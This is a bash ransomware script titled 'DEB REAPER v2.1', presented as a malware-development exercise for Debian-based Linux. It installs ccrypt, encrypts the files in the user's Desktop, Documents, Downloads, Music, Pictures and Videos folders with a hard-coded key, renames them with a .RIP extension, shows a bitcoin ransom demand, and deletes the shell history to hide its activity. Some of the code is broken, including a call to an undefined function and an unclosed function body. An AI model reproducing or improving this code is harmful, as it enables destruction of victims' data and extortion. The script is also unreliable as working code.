#!/bin/bash
                            
#               ;::::;                           
#             ;::::; :;                          
#           ;:::::'   :;                        
#          ;:::::; DEB  ;.                       
#         ,:::::'REAPPER;           OOO\         
#         ::::::;       ;          OOOOO\        
#         ;:::::; (---- ;         OOOOOOOO       
#        ,;::::::;     ;'         / OOOOOOO     
#      ;:::::::::`. ,,,;.        /  / DOOOOOO    
#    .';:::::::::::::::::;,     /  /     DOOOO  
#   ,::::::;::::::;;;;::::;,   /  /        DOOO  
#  ;`::::::`'::::::;;;::::: ,#/  /          DOOO 
#  :`:::::::`;::::::;;::: ;::#  /            DOOO
#  ::`:::::::`;:::::::: ;::::# /              DOO
#  `:`:::::::`;:::::: ;::::::#/               DOO
#   :::`:::::::`;; ;:::::::::##                OO
#   ::::`:::::::`;::::::::;:::#                OO
#   `:::::`::::::::::::;'`:;::#                O 
#    `:::::`::::::::;' /  / `:#                  
#     ::::::`:::::;'  /  /   `#  

# Created by Da2dalus a MalDev101 project
# This is only an experiment but it can be dangerous.
# I am not responsible for the damage.
# This ransomware works only on Debian based distributions.
# Tested on Linux (Ubuntu, Debian).

# DEB REAPER v2.1


KEY="ReAPER" # KEY

CCRYPT="/bin/ccrypt"

function ccryptcheck() {
   
   if [ -f "$CCRYPT" ]

   then
      scan
    
   else
      sudo apt install ccrypt -yy
      ccryptcheck
   
   fi
}

function encryptvideos() {
   
   cd "$HOME"
   cd Videos
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function encryptdesktop() {
   
   cd "$HOME"
   cd Desktop
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function encryptpictures() {
   
   cd "$HOME"
   cd Pictures
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function encryptdocuments() {
   
   cd "$HOME"
   cd Documents
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function encryptdownloads() {
   
   cd "$HOME"
   cd Downloads
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function encryptmusic() {
   
   cd "$HOME"
   cd Music
   local LS=$(ls -a)
   local LIST=$(echo "$LS" | tr "\n" " ")
   ccencrypt "$LIST" -k "$KEY"
   for f in *.cpt; do
      mv -- "$f" "${f%.cpt}.RIP"
   done

}

function cleanup() {
   
   echo "#!/bin/bash" > RIP.sh
   echo "sleep 8" >> RIP.sh
   echo "sudo mv DEB.REAPER.sh /dev/null" >> RIP.sh
   chmod 755 RIP.sh 
   ./RIP.sh && cd "$HOME" && rm .bash_history
   exit


function start() {
   
   ccryptcheck
   sleep 5
   encryptdesktop
   sleep 5
   encryptdocuments
   sleep 5
   encryptdownloads
   sleep 5
   zenity --warning --text="Your files are encrypted by DEB REAPER! Pay 500$ worth in bitcoin to this bitcoin address: Your Bitcoin Address so you can receive the decrypt instructions"
   encryptmusic
   sleep 5
   encryptpictures
   sleep 5
   encryptvideos
   sleep 5
   cleanup

}

start
